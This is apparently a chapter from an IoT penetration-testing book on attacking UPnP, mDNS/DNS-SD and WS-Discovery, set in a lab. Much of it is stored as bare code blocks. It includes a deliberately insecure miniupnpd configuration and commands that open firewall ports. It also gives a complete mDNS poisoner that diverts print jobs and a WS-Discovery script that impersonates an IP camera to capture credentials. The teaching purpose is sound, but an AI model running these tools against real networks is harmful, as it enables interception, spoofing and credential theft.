["```\nM-SEARCH * HTTP/1.1 \nST: ssdp:all \nMX: 5 \nMAN: ssdp:discover \nHOST: 239.255.255.250:1900\n```", "```\nNOTIFY * HTTP/1.1\\r\\n\nHOST: 239.255.255.250:1900\\r\\n\nCACHE-CONTROL: max-age=60\\r\\n\nLOCATION: http://192.168.10.254:5000/rootDesc.xml\\r\\n\nSERVER: OpenWRT/18.06-SNAPSHOT UPnP/1.1 MiniUPnPd/2.1\\r\\n\nNT: urn:schemas-upnp-org:service:WANIPConnection:2\\r\\n\n```", "```\n<service>\n  <serviceType>urn:schemas-upnp-org:service:WANIPConnection:2</serviceType>\n<serviceId>urn:upnp-org:serviceId:WANIPConn1</serviceId>\n<SCPDURL>/WANIPCn.xml</SCPDURL>\n1 <controlURL>/ctl/IPConn</controlURL>\n2 <eventSubURL>/evt/IPConn</eventSubURL>\n</service>\n```", "```\nconfig interface 'lan'\n        option ifname 'eth0'\n        option proto 'static'\n        option ipaddr '192.168.10.254'\n        option netmask '255.255.255.0'\n        option ip6assign '60'\n        option gateway '192.168.10.1'\n\nconfig interface 'wan'\n        option ifname 'eth1'\n        option proto 'dhcp'\n\nconfig interface 'wan6'\n        option ifname 'eth1'\n        option proto 'dhcpv6'\n```", "```\n# **opkg update && opkg install miniupnpd luci-app-upnp**\n```", "```\n# **vim /etc/init.d/miniupnpd**\n```", "```\nconfig_load \"upnpd\"\nupnpd_write_bool enable_natpmp 1\nupnpd_write_bool enable_upnp 1\nupnpd_write_bool secure_mode 0\n```", "```\nconfig upnpd 'config'\n        option download '1024'\n        option upload '512'\n        option internal_iface 'lan'\n        option external_iface 'wan' 1\n        option port '5000'\n        option upnp_lease_file '/var/run/miniupnpd.leases'\n        option enabled '1' 2\n        option uuid '125c09ed-65b0-425f-a263-d96199238a10'\n        option secure_mode '0'\n        option log_output '1'\n\nconfig perm_rule\n        option action 'allow'\n        option ext_ports '1024-65535'\n        option int_addr '0.0.0.0/0'\n        option int_ports '0-65535'3\n        option comment 'Allow all ports'\n```", "```\n# **/etc/init.d/miniupnpd restart**\n```", "```\n# **/etc/init.d/firewall restart**\n```", "```\n# **miranda**\nupnp> **msearch**\nupnp> **host list** \nupnp> **host get 0**\nupnp> **host details 0** \nupnp> **host send 0 WANConnectionDevice WANIPConnection AddPortMapping**\n       Set NewPortMappingDescription value to: **test**\n       Set NewLeaseDuration value to: **0**\n       Set NewInternalClient value to: **192.168.10.254**\n       Set NewEnabled value to: **1**\n       Set NewExternalPort value to: **5555**\n       Set NewRemoteHost value to: \n       Set NewProtocol value to: **TCP**\n       Set NewInternalPort value to: **80**\n```", "```\ncommonPorts = ['21','22','23','80','137','138','139','443','445','3389', '8080']\n```", "```\n# **nmap --top-ports 100 -v -oG –**\nNmap 7.70 scan initiated Mon Jul  8 00:36:12 2019 as: nmap --top-ports 100 -v -oG -\n# Ports scanned: TCP(100;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157) UDP(0;) SCTP(0;) PROTOCOLS(0;)\n```", "```\n# **apt-get install pip**\n# **pip install SOAPpy**\n# **pip install iplib**\n```", "```\n# **tar -xzf pip-20.0.2.tar.gz**\n# **cd pip-20.0.2**\n# **python2.7 setup install**\n```", "```\n# **./umap.py -c -i 74.207.225.18**\n```", "```\nupnp> **host send** **0** **WANConnectionDevice  WANIPv6FirewallControl  GetFirewallStatus**\nInboundPinholeAllowed : 1\nFirewallEnabled : 1\nupnp> **host send** **0** **WANConnectionDevice WANIPConnection GetStatusInfo**\nNewUptime : 10456\nNewLastConnectionError : ERROR_NONE\nNewConnectionStatus : Connected\n```", "```\nupnp> **host details 0**\nHost name:          [fd37:84e0:6d4f::1]:5000\nUPNP XML File:      http://[fd37:84e0:6d4f::1]:5000/rootDesc.xml\n\nDevice information: \n    Device Name: InternetGatewayDevice\n        Service Name: Device Protection\n            controlURL: /ctl/DP\n            eventSUbURL: /evt/DP\n            serviceId: urn:upnp-org:serviceId:DeviceProtection1\n            SCPDURL: /DP.xml\n            fullName: urn:schemas-upnp-org:service:DeviceProtection:1\n            ServiceActions:\n GetSupportedProtocols\n                    ProtocolList\n                        SupportedProtocols: \n                            dataType: string\n                            sendEvents: N/A\n                            allowedVallueList: []\n                         direction: out\n                SendSetupMessage       \n                …\n```", "```\n_ipps._tcp.local: type PTR, class IN, test._ipps._tcp.local\n```", "```\n# **pip install scapy**\n```", "```\nroot@kali:~/zeroconf/mdns/Pholus# **./pholus.py eth0 -rq -stimeout 10**\nsource MAC address: 00:0c:29:32:7c:14 source IPv4 Address: 192.168.10.10 source IPv6 address: fdd6:f51d:5ca8:0:20c:29ff:fe32:7c14\nSniffer filter is: not ether src 00:0c:29:32:7c:14 and udp and port 5353\nI will sniff for 10 seconds, unless interrupted by Ctrl-C\n------------------------------------------------------------------------\nSending mdns requests\n30:9c:23:b6:40:15 192.168.10.20 QUERY Answer: _services._dns-sd._udp.local. PTR Class:IN \"_nvstream_dbd._tcp.local.\"\n9c:8e:cd:10:29:87 192.168.10.245 QUERY Answer: _services._dns-sd._udp.local. PTR Class:IN \"_http._tcp.local.\"\n00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Question: 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.f.4.d.6.0.e.4.8.7.3.d.f.ip6.arpa. * (ANY) QM Class:IN\n00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Question: OpenWrt-1757.local. * (ANY) QM Class:IN\n00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: OpenWrt-1757.local. HINFO Class:IN \"X86_64LINUX\"\n00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: OpenWrt-1757.local. AAAA Class:IN \"fd37:84e0:6d4f::1\"\n00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.f.4.d.6.0.e.4.8.7.3.d.f.ip6.arpa. PTR Class:IN \"OpenWrt-1757.local.\"\n```", "```\n# **python pholus.py eth0 -afre -stimeout 1000**\n```", "```\n00:0c:29:f4:74:2a 192.168.10.219 QUERY Question: **ubuntu-133.local.** * (ANY) QM Class:IN\n00:0c:29:f4:74:2a 192.168.10.219 QUERY Auth_NS: ubuntu-133.local. AAAA Class:IN \"fdd6:f51d:5ca8:0:c81e:79a4:8584:8a56\"\n00:0c:29:f4:74:2a 192.168.10.219 QUERY Auth_NS: 6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa. PTR Class:IN \"ubuntu-133.local.\"\nQuery Name =  6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa  Type= 255\n00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Question: 6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa. * (ANY) QM Class:IN\nQuery Name =  ubuntu-134.local  Type= 255\n00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Question: ubuntu-134.local. * (ANY) QM Class:IN\n00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Auth_NS: ubuntu-134.local. AAAA Class:IN \"fdd6:f51d:5ca8:0:c81e:79a4:8584:8a56\"\n```", "```\n$ **ippserver test -v**\n```", "```\n$ **sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist**\n```", "```\n[Client 1] Accepted connection from \"192.168.10.199\".\n[Client 1] Starting HTTPS session.\n[Client 1E] Connection now encrypted.\n[Client 1E] POST /ipp/print\n[Client 1E] Continue\n[Client 1E] Get-Printer-Attributes successful-ok\n[Client 1E] OK\n[Client 1E] POST /ipp/print\n[Client 1E] Continue\n[Client 1E] Validate-Job successful-ok\n[Client 1E] OK\n[Client 1E] POST /ipp/print\n[Client 1E] Continue\n[Client 1E] Create-Job successful-ok\n[Client 1E] OK\n```", "```\n #!/usr/bin/env python\n  import time, os, sys, struct, socket\n  from socketserver import UDPServer, ThreadingMixIn\n  from socketserver import BaseRequestHandler\n  from threading import Thread\n  from dnslib import *\n\n  MADDR = ('224.0.0.251', 5353)\nclass UDP_server(ThreadingMixIn, UDPServer): 1\n    allow_reuse_address = True\n    def server_bind(self):\n      self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  \n      mreq = struct.pack(\"=4sl\", socket.inet_aton(MADDR[0]), socket.INADDR_ANY)\n      self.socket.setsockopt(socket.IPPROTO_IP, 2socket.IP_ADD_MEMBERSHIP, mreq)\n      UDPServer.server_bind(self)\n\n  def MDNS_poisoner(host, port, handler): 3\n    try:\n      server = UDP_server((host, port), handler)\n      server.serve_forever()\n except:\n      print(\"Error starting server on UDP port \" + str(port))\n\nclass MDNS(BaseRequestHandler):\n    def handle(self):\n      target_service = ''\n      data, soc = self.request\n      soc.sendto(d.pack(), MADDR)\n      print('Poisoned answer sent to %s for name %s' % (self.client_address[0], target_service))\n\ndef main(): 4\n    try:\n      server_thread = Thread(target=MDNS_poisoner,  args=('', 5353, MDNS,))\n      server_thread.setDaemon(True)\n      server_thread.start()\n\n      print(\"Listening for mDNS multicast traffic\")\n      while True:\n        time.sleep(0.1)\n\n    except KeyboardInterrupt:\n      sys.exit(\"\\rExiting...\")\n\n  if __name__ == '__main__':\n    main()\n```", "````The `MDNS_poisoner` function 3 creates an instance of the `UDP_server` and calls `serve_forever` on it to handle requests until an explicit shutdown. The `MDNS`class handles all incoming requests, parsing them and sending back the replies. Because this class is the brainpower of the poisoner, we’ll explore the class in more detail later. You’ll have to replace this block of code ([Listing 6-3](#listing6-3)) with the complete `MDNS` class in [Listing 6-2](#listing6-2).    The `main`function 4 creates the main thread for the mDNS server. This thread will automatically start new threads for each request, which the `MDNS.handle` function will handle.With`setDaemon(True)`, the server will exit when the main thread terminates, and you can terminate the main thread by pressing CTRL-C, which will trigger the `KeyboardInterrupt` exception. The main program will finally enter an infinite loop, and the threads will handle all the rest.    Now that we’ve created the skeleton, let’s outline the methodology for creating the `MDNS` class, which implements the mDNS poisoner:    1.  1. Capture network traffic to determine which packets you need to reproduce and save the *pcap* file for later. 2.  2. Export the raw packet bytes from Wireshark. 3.  3. Search for libraries implementing existing functionality, such as dnslib for the DNS packet handling, so you don’t reinvent the wheel. 4.  4. When you need to parse incoming packets, as is the case with the mDNS query, first use the previously exported packets from Wireshark to initially feed into the tool instead of getting new ones from the network. 5.  5. Start sending packets on the network, and then compare them with the first traffic dump. 6.  6. Finalize and refine the tool by cleaning up and commenting code, as well as adding real-time configurability via command line arguments.    Let’s see what our most important class, `MDNS`, does ([Listing 6-3](#listing6-3)). Replace the `MDNS` block in [Listing 6-2](#listing6-2) with this code.    ``` class MDNS(BaseRequestHandler):   def handle(self):     target_service = ''     data, soc = self.request 1     d = DNSRecord.parse(data) 2      # basic error checking - does the mDNS packet have at least 1 question?     if d.header.q < 1:       return      # we are assuming that the first question contains the service name we want to spoof     target_service = d.questions[0]._qname 3      # now create the mDNS reply that will contain the service name and our IP address     d = DNSRecord(DNSHeader(qr=1, id=0, bitmap=33792)) 4     d.add_answer(RR(target_service, QTYPE.SRV, ttl=120, rclass=32769, rdata=SRV(priority=0, target='kali.local', weight=0, port=8000)))     d.add_answer(RR('kali.local', QTYPE.A, ttl=120, rclass=32769, rdata=A(\"192.168.10.10\"))) 5     d.add_answer(RR('test._ipps._tcp.local', QTYPE.TXT, ttl=4500, rclass=32769, rdata=TXT([\"rp=ipp/print\", \"ty=Test Printer\", \"adminurl=https://kali:8000/ipp/print\", \"pdl=application/pdf,image/jpeg,image/pwg-raster\", \"product=(Printer)\", \"Color=F\", \"Duplex=F\", \"usb_MFG=Test\", \"usb_MDL=Printer\", \"UUID=0544e1d1-bba0-3cdf-5ebf-1bd9f600e0fe\", \"TLS=1.2\", \"txtvers=1\", \"qtotal=1\"]))) 6      soc.sendto(d.pack(), MADDR) 7     print('Poisoned answer sent to %s for name %s' % (self.client_address[0], target_service)) ```    Listing 6-3: The final `MDNS` class for our poisoner    We’re using Python’s `socketserver` framework to implement the server. The `MDNS` class has to subclass the framework’s `BaseRequestHandler` class and override its `handle()` method to process incoming requests. For UDP services, `self.request` 1 returns a string and socket pair, which we save locally. The string contains the data incoming from the network, and the socket pair is the IP address and port belonging to the sender of that data.    We then parse the incoming `data` using `dnslib` 2, converting them into a `DNSRecord` class that we can then use to extract the domain name 3 from the `QNAME` of the Question section. The Question section is the part of the mDNS packet that contains the Queries (for example, see [Figure 6-7](#figure6-7)). Note that to install `dnslib`, you can do the following:    ``` # **git clone https://github.com/paulc/dnslib** # **cd dnslib** # **python setup.py install** ```    Next, we must create our mDNS reply 4 containing the three DNS records we need (SRV, A, and TXT). In the Answers section, we add the SRV record that associates the `target_service` with our hostname (`kali.local`) and port 8000\\. We add the A record 5 that resolves the hostname to the IP address. Then we add the TXT record 6 that, among other things, contains the URL for the fake printer to be contacted at https://kali:8000/ipp/print.    Finally, we send the reply to the victim through our UDP socket 7.    As an exercise, we leave it to you to configure the hardcoded values contained in the mDNS reply step. You could also make the poisoner more flexible so it poisons a specific target IP and service name only.    #### Testing the mDNS Poisoner    Now let’s test the mDNS poisoner. Here is the attacker’s poisoner running:    ``` root@kali:~/mdns/poisoner# **python****3** **poison.py** Listening for mDNS multicast traffic Poisoned answer sent to 192.168.10.199 for name _universal._sub._ipp._tcp.local. Poisoned answer sent to 192.168.10.219 for name test._ipps._tcp.local. Poisoned answer sent to 192.168.10.199 for name _universal._sub._ipp._tcp.local. ```    We try to automatically grab the print job from the victim client, getting it to connect to us instead of the real printer by sending seemingly legitimate mDNS traffic. Our mDNS poisoner replies to the victim client 192.168.10.199, telling it that the attacker holds the `_universal._sub._ipp._tcp.local` name. The mDNS poisoner also tells the legitimate printer server (192.168.10.219) that the attacker holds the `test._ipps._tcp.local` name.    Remember that this is the name that the legitimate print server was advertising. Our poisoner, a simple proof of concept script at this stage, doesn’t distinguish between targets; rather, it indiscriminately poisons every request it sees.    Here is the ippserver that emulates a printer server:    ``` root@kali:~/tmp# **ls** root@kali:~/tmp# **ippserver test -d . -k -v** Listening on port 8000. Ignore Avahi state 2. printer-more-info=https://kali:8000/ printer-supply-info-uri=https://kali:8000/supplies printer-uri=\"ipp://kali:8000/ipp/print\" Accepted connection from 192.168.10.199 192.168.10.199 Starting HTTPS session. 192.168.10.199 Connection now encrypted. … ```    With the mDNS poisoner running, the client (192.168.10.199) will connect to the attacker’s ippserver instead of the legitimate printer (192.168.10.219) to send the print job.    But this attack doesn’t automatically forward the print job or document to the real printer. Note that in this scenario, the Bonjour implementation of mDNS/DNS-SD seems to query the `_universal` name every time the user tries to print something from the MacBook, and it would need to be poisoned as well. The reason is that our MacBook was connected to our lab via Wi-Fi, and macOS was trying to use AirPrint, a macOS feature for printing via Wi-Fi. The `_universal` name is associated with AirPrint.    ## Exploiting WS-Discovery    The *Web Services Dynamic Discovery Protocol* (*WS-Discovery*) is a multicast discovery protocol that locates services on a local network. Have you ever wondered what could happen if you pretended to be an IP camera by imitating its network behavior and attacking the server that manages it? Corporate networks, on which a large number of cameras reside, often rely on *video management servers*, software that lets system administrators and operators remotely control the devices and view their video feed through a centralized interface.    Most modern IP cameras support *ONVIF*, an open industry standard developed to let physical, IP-based security products work with each other, including video surveillance cameras, recorders, and associated software. It’s an open protocol that surveillance software developers can use to interface with ONVIF-compliant devices regardless of the device’s manufacturer. One of its features is *automatic device discovery*, which it typically carries out using WS-Discovery. In this section, we’ll explain how WS-Discovery works, create a proof of concept Python script for exploiting inherent protocol vulnerabilities, create a fake IP camera on the local network, and discuss other attack vectors.    ### How WS-Discovery Works    Without getting into too many details, we’ll provide a brief overview of how WS-Discovery works. In WS-Discovery terminology, a *Target Service* is an endpoint that makes itself available for discovery, whereas a *Client* is an endpoint that searches for Target Services. Both use SOAP queries over UDP to the 239.255.255.250 multicast address with the destination UDP port 3702\\. [Figure 6-13](#figure6-13) represents the message exchanges between the two.  ![f06013](Images/f06013.png)    Figure 6-13: WS-Discovery message exchanges between a Target Service and a Client      A Target Service sends a multicast *Hello* 1 when it joins a network. The Target Service can receive a multicast *Probe* 2, a message sent by a Client searching for a Target Service by *Type*, at any time. The Type is an identifier for the endpoint. For example, an IP camera could have NetworkVideoTransmitter as a Type. It might also send a unicast *Probe Match*3 if the Target Service matches a Probe (other matching Target Services might also send unicast Probe Matches). Similarly, a Target Service might receive a multicast *Resolve*4 at any time, a message sent by a Client searching for a Target by name, and send a unicast *Resolve Match*5 if it’s the target of a Resolve. Finally, when a Target Service leaves a network, it makes an effort to send a multicast *Bye* 6.    A Client mirrors the Target Service messages. It listens to the multicast Hello, might Probe to find Target Services or Resolve to find a particular Target Service, and listens to the multicast Bye. We mostly want to focus on the second and third steps 23 for the attack we’ll perform in this section.    ### Faking Cameras on Your Network    We’ll first set up a test environment with IP camera management software on a virtual machine, and then use a real network camera to capture packets and analyze how it interacts with the software through WS-Discovery in practice. Then we’ll create a Python script that will imitate the camera with the goal of attacking the camera management software.    #### Setting up    We’ll demonstrate this attack using an earlier version (version 7.8) of *exacqVision*, a well-known tool for IP camera management. You could also use a similar free tool, such as Camlytics, iSpy, or any kind of camera management software that uses WS-Discovery. We’ll host the software on a virtual machine with the IP address 192.168.10.240\\. The actual network camera we’ll be imitating has the IP address 192.168.10.245\\. You can find the version of exacqVision we’re using at [https://www.exacq.com/reseller/legacy/?file=Legacy/index.html/](https://www.exacq.com/reseller/legacy/?file=Legacy/index.html/)*.*    Install the exacqVision server and client on a Windows 7 system hosted on VMware, and then start the exacqVision client. It should connect locally to the corresponding server; the client acts as a user interface to the server, which should have started as a background service on the system. Then we can start discovering network cameras. On the Configuration page, click **exacqVision Server**▶**Configure System**▶**Add IP Cameras**, and then click the **Rescan Network** button ([Figure 6-14](#figure6-14)).  ![f06014](Images/f06014.png)    Figure 6-14: exacqVision client interface for discovering new network cameras using WS-Discovery      Doing so will send a WS-Discovery Probe (message 2 in [Figure 6-14](#figure6-14)) to the multicast address 239.255.255.250 over UDP port 3702\\.    #### Analyzing WS-Discovery Requests and Replies in Wireshark    As an attacker, how can we impersonate a camera on the network? It’s fairly easy to understand how typical WS-discovery requests and replies work by experimenting with an off-the shelf camera, such as Amcrest, as shown in this section. In Wireshark, start by enabling the “XML over UDP” dissector by clicking **Analyze** in the menu bar. Then click **Enabled Protocols**. Search for “udp” and select the **XML over UDP** box ([Figure 6-15](#figure6-15)).  ![f06015](Images/f06015.png)    Figure 6-15: Selecting the XML over UDP dissector in Wireshark      Next, activate Wireshark on the virtual machine that runs the exacqVision server and capture the Probe Match reply (message 3 in 9) from the Amcrest camera to the WS-Discovery Probe. We can then right-click the packet and click **Follow** ▶**UDP stream**. We should see the entire SOAP/XML request. We’ll need this request value in the next section as we develop our script; we’ll paste it into the `orig_buf` variable in [Listing 6-4](#listing6-4).    [Figure 6-16](#figure6-16) shows the output of the WS-Discovery Probe in Wireshark. The exacqVision client outputs this information whenever it scans the network for new IP cameras.  ![f06016](Images/f06016.png)    Figure 6-16: The WS-Discovery Probe from exacqVision, output by Wireshark      The most important part of this probe is the `MessageID` UUID (highlighted), because this needs to be included in the Probe Match reply. (You can read more about this in the official WS-Discovery specification at */s:Envelope/s:Header/a:RelatesTo MUST be the value of the [message id] property [WS-Addressing] of the Probe*.)    [Figure 6-17](#figure6-17) shows the Probe Match reply from the real Amcrest IP camera.  ![f06017](Images/f06017.png)    Figure 6-17: WS-Discovery Probe Match reply from an Amcrest IP camera on the network. Notice that the `RelatesTo` UUID is the same as the `MessageID` UUID that exacqVision sent.      The `RelatesTo` field contains the same UUID as the one in the `MessageID` of the XML payload that the exacqVision client sent.    #### Emulating a Camera on the Network    Now we’ll write a Python script that emulates a real camera on the network with the intent of attacking the exacqVision software and taking the place of the real camera. We’ll use Amcrest’s Probe Match reply to exacqVision as the foundation for creating our attacking payload. We need to create a listener on the network that receives the WS-Discovery Probe from exacqVision, extracts the MessageID from it, and uses it to finalize our attacking payload as a WS Probe Match reply.    The first part of our code imports necessary Python modules and defines the variable that holds the original WS-Discovery Probe Match reply from Amcrest, as shown in [Listing 6-4](#listing6-4).    ``` #!/usr/bin/env python import socket import struct import sys import uuid  buf = \"\" orig_buf = '''<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?><s:Envelope 1       >\\ <s:Header><a:MessageID>urn:uuid:_MESSAGEID_</a:MessageID><a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To><a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/ProbeMatches\\ 2 </a:Action><a:RelatesTo>urn:uuid:_PROBEUUID_</a:RelatesTo></s:Header><s:Body><d:ProbeMatches><d:ProbeMatch><a:EndpointReference><a:Address>uuid:1b77a2db-c51d-44b8-bf2d-418760240ab6</a:Address></a:EndpointReference><d:Types>dn:NetworkVideoTransmitter 3 tds:Device</d:Types><d:Scopes>onvif://www.onvif.org/location/country/china \\   onvif://www.onvif.org/name/Amcrest \\ 4  onvif://www.onvif.org/hardware/IP2M-841B \\  onvif://www.onvif.org/Profile/Streaming \\  onvif://www.onvif.org/type/Network_Video_Transmitter \\  onvif://www.onvif.org/extension/unique_identifier</d:Scopes>\\ <d:XAddrs>http://192.168.10.10/onvif/device_service</d:XAddrs><d:MetadataVersion>1</d:MetadataVersion></d:ProbeMatch></d:ProbeMatches></s:Body></s:Envelope>''' ```    Listing 6-4: Module imports and the definition of the original WS-Discovery Probe Match reply from the Amcrest camera    We start with the standard Python shebang line to make sure the script can run from the command line without specifying the full path of the Python interpreter, as well as the necessary module imports. Then we create the `orig_buf` variable 1, which holds the original WS-Discovery reply from Amcrest as a string. Recall from the previous section that we pasted the XML request into the variable after capturing the message in Wireshark. We create a placeholder `_MESSAGEID_`2. We’ll replace this with a new unique UUID that we’ll generate every time we receive a packet. Similarly, the `_PROBEUUID_`3will contain the UUID as extracted from the WS-Discovery Probe at runtime. We have to extract it every time we receive a new WS-Discovery Probe from exacqVision. The `name` portion 4 of the XML payload is a good place to fuzz with malformed input, because we saw that the `Amcrest` name appears in the client’s listing of cameras and will thus have to first be parsed by the software internally.    The next part of the code, in [Listing 6-5](#listing6-5), sets up the network sockets. Place it immediately after the code in [Listing 6-3](#listing6-3).    ``` sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) sock.setsockopt(socket.SOL_SOCKET, 1socket.SO_REUSEADDR, 1) sock.bind(('239.255.255.250', 3702)) mreq = struct.pack(\"=4sl\", socket.inet_aton(2\"239.255.255.250\"), socket.INADDR_ANY) sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) ```    Listing 6-5: Setting up the network sockets    We create a UDP socket and set the `SO_REUSEADDR` socket option 1 that lets the socket bind to the same port whenever we restart the script. Then we bind to the multicast address 239.255.255.250 on port 3702, because these are the standard multicast address and default port used in WS-Discovery. We also have to tell the kernel that we’re interested in receiving network traffic directed to 239.255.255.250 by joining that multicast group address 2.    [Listing 6-6](#listing6-6) shows the final part of our code, which includes the main loop.    ```  while True:     print(\"Waiting for WS-Discovery message...\\n\", file=sys.stderr)     data, addr = sock.recvfrom(1024) 1     if data:       server_addr = addr[0] 2       server_port = addr[1]       print('Received from: %s:%s' % (server_addr, server_port), file=sys.stderr)       print('%s' % (data), file=sys.stderr)       print(\"\\n\", file=sys.stderr)        # do not parse any further if this is not a WS-Discovery Probe       if \"Probe\" not in data: 3         continue        # first find the MessageID tag       m = data.find(\"MessageID\") 4       # from that point in the buffer, continue searching for \"uuid\" now       u = data[m:-1].find(\"uuid\")       num = m + u + len(\"uuid:\")       # now get where the closing of the tag is       end = data[num:-1].find(\"<\")       # extract the uuid number from MessageID       orig_uuid = data[num:num + end]       print('Extracted MessageID UUID %s' % (orig_uuid), file=sys.stderr)        # replace the _PROBEUUID_ in buffer with the extracted one       buf = orig_buf       buf = buf.replace(\"_PROBEUUID_\", orig_uuid) 5       # create a new random UUID for every packet       buf = buf.replace(\"_MESSAGEID_\", str(uuid.uuid4())) 6        print(\"Sending WS reply to %s:%s\\n\" % (server_addr, server_port), file=sys.stderr)        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 7       udp_socket.sendto(buf, (server_addr, server_port)) ```    Listing 6-6: The main loop, which receives a WS-Discovery Probe message, extracts the `MessageID`, and sends the attacking payload    The script enters an infinite loop in which it listens for WS-Discovery Probe messages 1 until we stop it (CTRL-C will exit the loop on Linux). If we receive a packet that contains data, we get the sender’s IP address and port 2 and save them in the variables `server_addr` and `server_port`, respectively. We then check whether the string `\"Probe\"`3 is included inside the received packet; if it is, we assume this packet is a WS-Discovery Probe. Otherwise, we don’t do anything else with the packet.    Next, we try to find and extract the UUID from the `MessageID` XML tag without using any part of the XML library (because this would create unnecessary overhead and complicate this simple operation), relying only on basic string manipulation 4. We replace the `_PROBEUUID_` placeholder from [Listing 6-3](#listing6-3) with the extracted UUID 5 and create a new random UUID to replace the `_MESSAGE_ID`placeholder 6. Then we send the UDP packet back to the sender 7.    Here is an example run of the script against the exacqVision software:    ``` root@kali:~/zeroconf/ws-discovery# python3 exacq-complete.py  Waiting for WS-Discovery message... Received from: 192.168.10.169:54374 <?xml version=\"1.1\" encoding=\"utf-8\"?><Envelope  ><Header><wsa:MessageID >urn:uuid:2ed72754-2c2f-4d10-8f50-79d67140d268</wsa:MessageID><wsa:To >urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action >http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action></Header><Body><Probe xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xmlns:xsd=http://www.w3.org/2001/XMLSchema ><Types>dn:NetworkVideoTransmitter</Types><Scopes /></Probe></Body></Envelope> Extracted MessageID UUID 2ed72754-2c2f-4d10-8f50-79d67140d268 Sending WS reply to 192.168.10.169:54374 Waiting for WS-Discovery message... ```    Notice that every time you run the script, the MessageID UUID will be different. We leave it as an exercise for you to print the attacking payload and verify that same UUID appears in the `RelatesTo` field inside it.    In the exacqClient interface, our fake camera appears in the list of devices, as shown in [Figure 6-18](#figure6-18).  ![f06018](Images/f06018.png)    Figure 6-18: Our fake camera appears on the exacqClient list of IP cameras.      In the next section, we’ll explore what you could accomplish once you’ve been registered as a camera.    ### Crafting WS-Discovery Attacks    What types of attacks can you conduct by abusing this simple discovery mechanism? First, you can attack the video management software through this vector, because XML parsers are notorious for bugs that lead to memory corruption vulnerabilities. Even if the server doesn’t have any other exposed listening port, you could feed it malformed input through WS-Discovery.    A second attack would have two steps. First, cause a denial of service on a real IP camera so it loses connection to the video server. Second, send WS-Discovery information that makes your fake camera look like the legitimate, disconnected one. In that case, you might be able to fool the server’s operator into adding the fake camera to the list of cameras that the server manages. Once added, you can feed the server with artificial video input.    In fact, in some cases you could carry out the previous attack without even causing a denial of service in the real IP camera. You’d just have to send the WS-Discovery Probe Match response to the video server before the real camera sends it. In that case, and assuming the information is identical or similar enough (replicating the Name, Type, and Model fields from the real camera is enough most times), the real camera won’t even appear in the management software if you’ve successfully taken its place.    Third, if the video software uses an insecure authentication to the IP camera (for example, HTTP basic authentication), it’s possible to capture the credentials. An operator who adds your fake camera will type in the same username and password as the original one. In that case, you might be able to capture the credentials as the server attempts to authenticate against what it assumes is the real one. Because password reuse is a common problem, it’s likely that other cameras on the network use the same password, especially if they’re of the same model or vendor.    A fourth attack could be to include malicious URLs in the WS-Discovery Match Probe’s fields. In some cases, the Match Probe is displayed to the user, and the operator might be tempted to visit the links.    Additionally, the WS-Discovery standard includes a provision for “Discovery Proxies.” These are essentially web servers that you could leverage to operate WS-Discovery remotely, even across the internet. This means that the attacks described here could potentially take place without the adversary being positioned on the same local network.    ## Conclusion    In this chapter, we analyzed UPnP, WS-Discovery, and mDNS and DNS-SD, all of which are common zero-configuration network protocols in IoT ecosystems. We described how to attack an insecure UPnP server on OpenWrt to punch holes in the firewall, and then discussed how to exploit UPnP over WAN interfaces. Next, we analyzed how mDNS and DNS-SD work and how you can abuse them, and we built an mDNS poisoner in Python. Then we inspected WS-Discovery and how to exploit it to conduct a variety of attacks on IP camera management servers. Almost all of these attacks rely on the inherent trust that these protocols put on participants in the local network, favoring automation over security.````"]